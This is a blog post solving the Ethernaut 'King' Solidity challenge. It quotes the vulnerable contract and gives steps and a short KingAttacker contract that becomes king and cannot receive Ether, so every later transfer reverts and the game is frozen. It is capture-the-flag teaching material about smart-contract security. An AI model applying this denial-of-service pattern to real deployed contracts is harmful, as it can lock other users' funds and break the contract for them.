---
layout: post
title: Ethernaut - 9. King
date:  2022-08-28
tags: ethernaut solidity
---

## Difficulty: 🌕🌕🌕🌑🌑
> The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD <br /><br />
Such a fun game. Your goal is to break it.<br />
When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

## Writeup
There is the warning from Solidity document : 
> When Ether is sent directly to a contract (without a function call, i.e. sender uses send or transfer) but the receiving contract does not define a receive Ether function or a payable fallback function, an exception will be thrown, sending back the Ether (this was different before Solidity v0.4.0). If you want your contract to receive Ether, you have to implement a receive Ether function (using payable fallback functions for receiving Ether is not recommended, since the fallback is invoked and would not fail for interface confusions on the part of the sender).

If king is a contract that can not receive Ether, `king.transfer(msg.value)` fails every time it is executed. 

1. Get new instance.
2. Call the method
    ``` javascript

    await contract._king()
    // '0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5'
    // owner address is '0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5' too.

    ```
2. Create a contract without `receive` and `fallback` . 
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import './9_King.sol';

    contract KingAttacker {
        function attack(address payable _addr) public payable {
            King king = King(_addr);

            (bool sent, ) = address(king).call.value(msg.value)("");
            require(sent, "Failed to send value");
        }
    }
    ```
3. Compile & deploy.
4. Call `attack` method with the level instance address as the parameter `_addr` and value 1wei ( the same as state variable `prize`) .
5. Call the method
    ``` javascript

    await contract._king()
    // Your KingAttacker contract address

    ```
6. Submit instance ξ( ✿＞◡❛)

## Reference
- [Solidity by example - Sending Ether (transfer, send, call)](https://solidity-by-example.org/sending-ether/)
- [Solidity by example - Call](https://solidity-by-example.org/call/)
- [Receive Ether Function](https://docs.soliditylang.org/en/v0.8.16/contracts.html#receive-ether-function)